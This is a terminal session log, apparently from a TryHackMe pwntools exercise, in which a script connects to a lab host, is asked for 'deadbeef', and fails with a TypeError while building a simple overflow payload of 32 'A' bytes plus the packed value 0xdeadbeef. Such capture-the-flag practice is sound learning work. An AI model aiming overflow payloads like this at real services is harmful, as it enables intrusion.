@@ -1,0 +1,19 @@
+Script started on 2025-05-08 15:42:39+03:00 [COMMAND="python3 get.flag.py" TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="104" LINES="27"]
+[x] Opening connection to pwntools.thm on port 1337
+[A[[1m[34m▁[m] 
+[5G[AOpening connection to pwntools.thm on port 1337: Trying 10.10.179.74
+[A[[1m[34m▃[m] 
+[A[[1m[34m▄[m] 
+[A[[1m[34m▅[m] 
+[A[[1m[34m▆[m] 
+[5G[A[KOpening connection to pwntools.thm on port 1337: Done
+[A[[1m[32m+[m] 
+b'Give me deadbeef: '
+[38;5;26mTraceback (most recent call last):[39m
+  File [38;5;28m"/home/h471x/Desktop/tryhackme/learning/exploitation/intro.to.pwntools/decryption/networking/get.flag.py"[39m, line [38;5;241m12[39m, in <module>
+[38;5;250m    [39mpayload [38;5;241m=[39m [38;5;124m"[39m[38;5;130;01m\x41[39;00m[38;5;124m"[39m [38;5;241m*[39m [38;5;241m32[39m [38;5;241m+[39m p32([38;5;241m0xdeadbeef[39m)
+[38;5;250m              [39m~~~~~~~~~~~~^~~~~~~~~~~~~~~~~
+[38;5;160mTypeError[39m: can only concatenate str (not "bytes") to str
+[[1m[34m*[m] Closed connection to pwntools.thm port 1337
+
+Script done on 2025-05-08 15:42:40+03:00 [COMMAND_EXIT_CODE="1"]
